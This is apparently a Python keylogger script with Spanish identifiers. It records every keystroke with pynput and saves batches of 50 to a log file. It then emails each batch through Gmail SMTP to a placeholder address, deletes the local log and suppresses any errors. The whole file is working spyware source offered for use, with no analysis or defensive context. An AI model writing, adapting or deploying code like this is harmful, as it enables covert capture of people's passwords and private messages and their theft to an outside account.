#!/usr/bin/env python
#_*_ coding: utf8 _*_

import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pynput.keyboard
import sys
from os import remove
reload(sys)
sys.setdefaultencoding('utf8')
lista_t = []

def envio():
	msg = MIMEMultipart()
	passwd = <YOU_PASSWD_EMAIL>
	msg['From'] = <YOU_EMAIL>
	msg['To'] = <YOU_EMAIL>
	msg['Subjet'] = 'Keylogger prueba'
	msg.attach(MIMEText(file('log.txt').read()))
	remove('log.txt')
	del lista_t[:]
	try:
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		server.login(msg['From'],passwd)
		server.sendmail(msg['From'],msg['To'],msg.as_string())
		server.quit()
	except:
		pass


def imprimir():
	log_file = open('log.txt','w+')
	teclas = ''.join(lista_t)
	log_file.write(teclas)
	log_file.write('\n')
	log_file.close()
	time.sleep(1)
	envio()



def convertir(key):

	if isinstance(key,pynput.keyboard.KeyCode):
		return key.char
	else:
		return str(key)

def comprueba():
	if len(lista_t) >= 50:
		imprimir()
	else:
		pass

def pulsacion(key):

	key1 = convertir(key)

	if key1 == "Key.esc":
		lista_t.append('esc')
	elif key1 == "Key.space":
		lista_t.append(' ')
	elif key1 == "Key.enter":
		lista_t.append('\n')
		#imprimir()
	elif key1 == "Key.alt_r":
		lista_t.append('')
	elif key1 == "Key.ctrl":
		lista_t.append('')
	elif key1 == "Key.shift":
		pass
	elif key1 == "Key.ctrl_l":
		pass
	elif key1 == "Key.backspace":
		pass
	elif key1 == "Key.tab":
		pass
		lista_t.append('\n')
	else:
		lista_t.append(key1)
	comprueba()

with pynput.keyboard.Listener(on_press=pulsacion) as listen:
	listen.join()#listen es un objeto de Listener y se pone en ejecucion con join
